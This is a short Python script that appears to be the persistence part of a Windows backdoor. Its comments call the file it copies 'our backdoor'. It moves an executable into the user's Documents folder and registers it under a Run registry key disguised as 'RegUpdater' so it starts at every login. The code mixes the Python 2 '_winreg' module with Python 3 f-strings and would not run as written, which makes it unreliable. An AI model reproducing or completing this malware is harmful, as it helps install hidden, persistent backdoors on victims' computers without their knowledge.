from sys import argv as g
import os
import shutil
import _winreg as wreg
import subprocess

# gets arguments
file = g[1]

#Get the current working directory
path = os.getcwd().strip('\n')


#Get the user profile directory
Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')

destination = userprof.strip('\n\r') + '\\Documents\\' + f'{file}.exe'


if not os.path.exists(destination):
    #If above test is true, it means its the first time the script has run
    #So we copy our backdoor to our destination folder
    shutil.copyfile(path+f'\{file}.exe', destination)
                    
    #Create a registry setting called 'RegUpdater' pointing to the location of our file
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0, wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
    key.Close()
                   